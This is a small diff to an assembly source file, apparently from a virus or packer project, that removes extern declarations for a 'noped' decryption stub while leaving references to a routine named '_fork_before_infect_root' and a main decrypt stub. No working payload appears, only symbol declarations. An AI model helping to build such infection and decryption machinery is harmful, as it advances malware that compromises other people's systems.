@@ -127,11 +127,6 @@
 		extern _fork_before_infect_root
 	%endif
 
-	%ifndef DEPACKER_NOPED_S
-		extern _decrypt_noped
-		extern _end_decrypt_noped
-	%endif
-
 	%ifndef DEPACKER_S
 		extern _decrypt
 		extern _end_decrypt
